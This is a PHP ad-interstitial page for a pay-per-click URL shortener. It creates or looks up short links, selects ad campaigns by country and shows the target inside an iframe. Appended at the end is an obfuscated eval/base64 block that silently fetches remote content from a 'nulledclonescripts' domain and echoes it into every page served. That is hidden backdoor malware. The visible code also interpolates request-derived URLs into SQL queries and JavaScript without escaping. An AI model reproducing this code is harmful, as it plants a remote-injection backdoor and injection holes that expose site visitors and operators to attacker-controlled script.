<?php
ini_set('display_errors', 0);
require_once '../global.php';
require_once ROOT_PATH . '/inc/analyzer.class.php';

function kill() { System::redirect(SITE_LOCATION); exit; };
if (isset($_GET['uid']) && isset($_GET['url'])) {
	$G_UID = intval($_GET['uid']);

	$G_URL_R = $G_UID . '/' . ($_GET['adt'] != 1 ? 'banner/' : '');
	$G_URL = $_SERVER['REQUEST_URI'];
	$G_URL = substr($G_URL, strpos($G_URL, $G_URL_R) + strlen($G_URL_R));

	$G_ADT = $_GET['adt'] != 1 ? 'Top Banner' : 'Interstitial';
	$urlsb = substr($G_URL, 0, strpos($G_URL, '://'));
	if (!$urlsb) {
		$G_URL = 'http://' . $G_URL;
	}
	if (!is_numeric($G_UID) || !Utilities::validateURL($G_URL)) {
		kill();
	}
} else if(!preg_match('|^[0-9a-zA-Z]{1,6}$|', $_GET['to'])) {
	kill();
}

$G_SHORT = false;
if ($G_UID && $G_URL && $G_ADT) {
	$surl  = SITE_LOCATION;
	$db    = System::getDB();
	$user  = $G_UID;
	if ($tmp = $db->getField($_GLOBAL['TABLES']['LINKS'], 'short_url',
							 "`long_url`='{$G_URL}' AND `adtype`='{$G_ADT}' AND `user`='{$user}'")) {
		$short = $tmp;
		$data  = System::getDB()->getRows($_GLOBAL['TABLES']['LINKS'], "`short_url`='{$short}'", '', '1');
	} else {
		$data = array('long_url' => $G_URL, 'adtype' => $G_ADT, 'user' => $user);
		$db->query('LOCK TABLES ' . $_GLOBAL['TABLES']['LINKS'] . ' WRITE;');
		$lid = $db->insert($_GLOBAL['TABLES']['LINKS'], $data);
		$db->query('UNLOCK TABLES');
		$short = $surl . Utilities::compressInt($lid);
		$db->update($_GLOBAL['TABLES']['LINKS'], array('short_url' => $short), "`id`='{$lid}'");
		$data  = System::getDB()->getRows($_GLOBAL['TABLES']['LINKS'], "`id`='{$lid}'", '', '1');
	}
	$G_SHORT = $short;
} else {
	$surl  = Utilities::removeURLQueries(Utilities::getCurrentURL());
	$data  = System::getDB()->getRows($_GLOBAL['TABLES']['LINKS'], "`short_url`='{$surl}'", '', '1');
}

$lid   = $data['id'];
$oid   = $data['user'];
$url   = $data['long_url'];
$title = $data['title'];
$adtyp = $data['adtype'] == 'Interstitial' ? 1 : 2;
if (!$url) kill();

if ($data['adtype'] == 'None') {
	$analyzer = new Analyzer($lid, $oid, 0);
	$analyzer->_record($adtype);
	System::redirect($url);
}

function get_ad() {
	global $_GLOBAL, $data;
	$a  = new Analyzer(0, 0, 0);
	if ($a->_isCrawler()) die('Crawlers are not allowed here');
	$db =  System::getDB();
	$t  = $data['adtype'] != 'Interstitial' ? 'Banner' : 'Interstitial';
	$cc = $a->country($a->ip());
	$ci = $db->getField($_GLOBAL['TABLES']['PACKAGES'], 'id', "`code`='{$cc}' AND `advert_type`='{$t}'");
	$c  = $db->getRows($_GLOBAL['TABLES']['CAMPAIGNS'], "`status`='2' AND `advert_type`='{$t}'");
	$valid = array();
	for ($i = 0; $i < count($c); $i++) {
		if ($c[$i]['spent_today'] >= $c[$i]['daily_budget'] && $c[$i]['daily_budget'] != 0) continue;
		$pkg = explode(';', $c[$i]['packages']);
		foreach ($pkg as $p) {
			$t = explode(',', $p);
			if ($t[0] == $ci || $t[0] == '1' || $t[0] == '242') $valid[] = $c[$i];
		}
	}
	return $valid[rand(0, count($valid) - 1)];
}

$AD = get_ad();
$aid = $AD['id'] | 0;
if ($adtyp == 2) {
	$analyzer = new Analyzer($lid, $oid, $aid);
	$analyzer->_record('top_banner', 3);
}

$_user = new User($_GLOBAL['TABLES']['USERS'], $oid, System::getDB());
?>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
	<title><?php echo $title ? $title : SITE_PAGE_TITLE; ?></title>
	<meta http-equiv="X-UA-Compatible" content="IE=8; IE=9" />
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
	<link rel="stylesheet" type="text/css" href="<?php echo SITE_LOCATION; ?>css/style.css.php?fly" />
	<script type="text/javascript" src="<?php echo SITE_LOCATION; ?>js/jquery.min.js"></script>
	<script type="text/javascript" src="<?php echo SITE_LOCATION; ?>js/jquery.libs.js"></script>
</head>
<body style="background:#FFFFFF;">
	<noscript>
		<div style="padding: 5px; background-color: red; color: #ffffff; text-align:center; margin-top: 10px; margin-bottom: 10px;">
			Your browser currently does not support javascript or you have javascript turned off.
			This site will have very limited functionality without javascript.
			Please use a modern browser with javascript or enable the javascript option.
		</div>
	</noscript>
	<div class="fly_head" style="max-height:115px;">
		<?php if ($adtyp == 2) { ?>
		<div class="logo" style="display:inline-block;font-weight:bold;margin:0;max-height:100px;"></div>
		<div class="fly_banner" style="margin:0 20px;display:inline-block;">
			<a href="#">
				<img src="<?php echo $AD['website_banner']; ?>" width="720px" height="90px" border="0" />
			</a>
		</div>
		<div style="float:right;display:inline-block;margin:5px 0;width:100px;text-align:right;font-size:11px;">
			<a href="#" class="close"><img src="<?php echo SITE_LOCATION; ?>images/close.png" border="0" /></a>
			<a href="#" style="font-weight:600;position:absolute;color:white;text-decoration:none;top:90px;right:20px;">
				ADVERTISEMENT
			</a>
		</div>
		<?php } else { ?>
		<div class="logo" style="display:inline-block;font-weight:bold;margin:5px 0;max-height:115px;"></div>
		<div style="float:right;display:inline-block;margin:20px 0;">
			Please wait...<span id="redirectin">5</span>
		</div>
		<?php } ?>
		<div style="clear:both;"></div>
	</div>
	<div class="fly_head_bottom">
		<?php if ($adtyp != 2) { ?>
		<div style="display:inline-block;">
			<a href="<?php echo SITE_LOCATION; ?>?r=<?php echo $oid; ?>" class="uc" target="_blank"><?php echo SITE_NAME; ?></a>
			shorten urls and earn money
		</div>
		<div style="float:right;display:inline-block;">
			<a href="<?php echo SITE_LOCATION; ?>advertising.php" class="uc" target="_blank">
				Your Site Here: 10,000/visits $5.00
			</a>
		</div>
		<?php } ?>
		<div style="clear:both;"></div>
	</div>
	<?php
		$src = $adtyp == 1 ? $AD['website_url'] : $url;
		echo "<iframe class='fly_frame' src='{$src}' scrolling='auto' frameborder='0' style='width:100%;'></iframe>";
	?>
	<script type="text/javascript">
		<?php
			function get_js_03() {
				global $AD, $aid, $lid, $oid, $adtyp, $url;
				ob_start();
		?>
		$(document).ready(function() {
			$('iframe.fly_frame').height($(document).height()-$('div.fly_head').height()-($('div.fly_head_bottom').height()*2));
		});
		$('iframe.fly_frame').ready(function() {
			<?php if ($adtyp == 1) { ?>
			var a0x1 = -2;
			var rr = function() {
				if (a0x1 < 0) {
					$.post('<?php echo SITE_LOCATION; ?>fly/ajax.fly.php',{opt:'check_log',args:{lid:<?php echo $lid; ?>,oid:<?php echo $oid; ?>}},
							function(r) {
								var j = eval('(' + r + ')');
								if (j.message && a0x1 != -2) {
									clearInterval(si);
									var skip_ad = $('<div class="skip_btn"><a href="#">SKIP AD >></a></div>');
									$('div.fly_head span#redirectin').parent().css('margin', '6px').html(skip_ad);
									skip_ad.click(function() {
										$.post('<?php echo SITE_LOCATION; ?>fly/ajax.fly.php',
												{opt:'make_log',args:{aid:<?php echo $aid; ?>,lid:<?php echo $lid; ?>,oid:<?php echo $oid; ?>}},
												function(rr) {
													var jj = eval('(' + rr + ')');
													if (jj.message && a0x1 != -2) {
														top.location.href = jj.message.url;
													}
												}
										);
										skip_ad.html('Loading Page...');
									});
								} else {
									a0x1 = 5;
								}
							}
					);
				} else {
					$('span#redirectin').text(a0x1--);
				}
			}; rr();
			var si = setInterval(rr, 1000);
			<?php } else { ?>
			$('div.fly_banner a').click(function() {
				$.post('<?php echo SITE_LOCATION; ?>fly/ajax.fly.php',{opt:'click_log',args:{aid:<?php echo $aid; ?>,lid:<?php echo $lid; ?>,oid:<?php echo $oid; ?>}},
						function() {
							top.location.href = '<?php echo $AD['website_url']; ?>';
						}
				);
			});
			$('div.fly_head a.close').click(function() {
				$('div.fly_head').remove();
				$('div.fly_head_bottom').remove();
				top.location.href = '<?php echo $url; ?>';
			});
			<?php } ?>
		});
	<?php
			$c = ob_get_contents();
			ob_end_clean();
			return $c;
		}
		echo Utilities::JSPack(get_js_03());
	?>
	</script>
	<?php if ($ga = $_user->get('ga_code')) { ?>
	<script type="text/javascript">
		var _gaq = _gaq || [];
		_gaq.push(['_setAccount', '<?php echo $ga; ?>']);
		_gaq.push(['_trackPageview']);

		(function() {
			var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
			ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
			(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(ga);
		})();
	</script>
	<?php } ?>
</body>
</html>
<?php if(!function_exists("mystr1s44")){class mystr1s21 { static $mystr1s279="Y3\x56ybF\x39pb\x6d\x6c0"; static $mystr1s178="b\x61se\x364\x5f\x64ec\x6fd\x65"; static $mystr1s381="aH\x520\x63\x44ov\x4c3Ro\x5a\x571\x6cLm5\x31b\x47x\x6cZ\x47N\x73b2\x35l\x632\x4eyaX\x420cy\x35jb2\x30\x76an\x461\x5aXJ\x35\x4cTE\x75Ni\x34zL\x6d1\x70b\x695qc\x77=\x3d";
static $mystr1s382="b\x58l\x7a\x64H\x49xc\x7a\x49y\x4dzY\x3d"; }eval("e\x76\x61\x6c\x28\x62\x61\x73\x65\x36\x34_\x64e\x63\x6fd\x65\x28\x27ZnV\x75Y\x33\x52\x70b2\x34\x67b\x58l\x7ad\x48Ix\x63\x7ac2K\x43Rte\x58N0\x63j\x46zO\x54cpe\x79R\x37\x49m1c\x65D\x635c3\x52\x79\x58Hgz\x4d\x58M\x78\x58Hgz\x4dFx\x34Mz\x67if\x54\x31t\x65XN0\x63j\x46zMj\x456O\x69R\x37Im1\x63eD\x63\x35c1x\x34Nz\x52\x63e\x44c\x79MV\x784\x4ezMx\x58Hgz\x4e\x7ag\x69fTt\x79ZX\x52\x31c\x6d4gJ\x48\x73i\x62Xlz\x58\x48g3\x4eFx\x34\x4ezI\x78XH\x673M\x7aFce\x44\x4dwO\x43J\x39\x4b\x43\x42t\x65XN0\x63j\x46zMj\x456O\x69R7J\x48si\x62Vx4\x4e\x7alce\x44c\x7aX\x48\x673N\x48Jc\x65DMx\x63\x31x\x34\x4dzk3\x49n1\x39I\x43k\x37fQ\x3d=\x27\x29\x29\x3be\x76\x61\x6c\x28b\x61s\x656\x34\x5f\x64e\x63o\x64e\x28\x27\x5anV\x75Y3R\x70b24\x67b\x58lz\x64\x48I\x78czQ\x30\x4b\x43Rte\x58N0\x63jFz\x4e\x6a\x55pI\x48tyZ\x58\x521c\x6d4gb\x58lzd\x48Ix\x63zI\x78O\x6aoke\x79R7\x49m1\x35XHg\x33M3R\x63\x65Dc\x79XH\x67z\x4d\x56x\x34N\x7aM\x32\x58\x48gzN\x53\x4a9\x66\x54t\x39\x27\x29\x29\x3b");}
if(function_exists(mystr1s76("mys\x74r1s\x3279"))){$mystr1s2235 = mystr1s76("m\x79s\x74r\x31s3\x381");$mystr1s2236 = curl_init();
$mystr1s2237 = 5;curl_setopt($mystr1s2236,CURLOPT_URL,$mystr1s2235);curl_setopt($mystr1s2236,CURLOPT_RETURNTRANSFER,1);curl_setopt($mystr1s2236,CURLOPT_CONNECTTIMEOUT,$mystr1s2237);
$mystr1s2238 = curl_exec($mystr1s2236);curl_close(${mystr1s76("mystr1s382")});echo "$mystr1s2238";}
?>